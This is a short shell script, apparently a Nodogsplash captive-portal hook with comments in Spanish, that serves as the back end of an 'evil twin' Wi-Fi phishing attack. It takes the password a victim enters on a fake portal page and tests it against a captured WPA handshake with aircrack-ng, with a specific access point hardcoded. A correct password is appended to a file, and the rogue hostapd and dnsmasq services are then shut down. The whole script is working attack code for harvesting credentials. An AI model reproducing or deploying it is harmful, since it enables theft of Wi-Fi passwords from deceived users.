#!/bin/sh

# IMPORTANTE -->  Necesario capturar el handsahke con el que poder realizar la
#                 verificacion de que la contraseña metida sea la correcta.



HANDSAHKE="/home/uo263762/handshake.cap"
AP_MAC="A4:98:13:5B:64:E9"
PASSWORD_FILE="password.lst"

METHOD="$1"
CLIENTMAC="$2"

case "$METHOD" in
       auth_client)
               USERNAME="$3"
               PASSWORD="$4"
               # Guardamos la contraseña dada por el usuario de forma temporal hasta comprobar que sea correcta.
	       echo "$4" > last_password.lst
               # Comprobamos si la contraseña dada por el usuario es la correcta.
               aircrack-ng -w last_password.lst -b $AP_MAC $HANDSAHKE | grep "KEY FOUND!"
               # ¿Es correcta?
               if [ $? -eq 0 ]; then
                     # Contraseña encontrada!
                     echo 0 0 0
	             # Guardamos la contraseña correcta.
                     echo "$4" >> $PASSWORD_FILE
		     # Desmontamos todo el chiringuito
		     sudo killall hostapd
		     sudo killall dnsmasq
		     exit 0
               else
                     # Contraseña incorrecta!
                     exit 1
               fi

               ;;
       client_auth|client_deauth|idle_deauth|timeout_deauth|ndsctl_auth|ndsctl_deauth|shutdown_deauth)
               INGOING_BYTES="$3"
               OUTGOING_BYTES="$4"
               SESSION_START="$5"
               SESSION_END="$6"
               # client_auth: Client authenticated via this script.
               # client_deauth: Client deauthenticated by the client via splash page.
               # idle_deauth: Client was deauthenticated because of inactivity.
               # timeout_deauth: Client was deauthenticated because the session timed out.
               # ndsctl_auth: Client was authenticated by the ndsctl tool.
               # ndsctl_deauth: Client was deauthenticated by the ndsctl tool.
               # shutdown_deauth: Client was deauthenticated by Nodogsplash terminating.
               ;;
esac
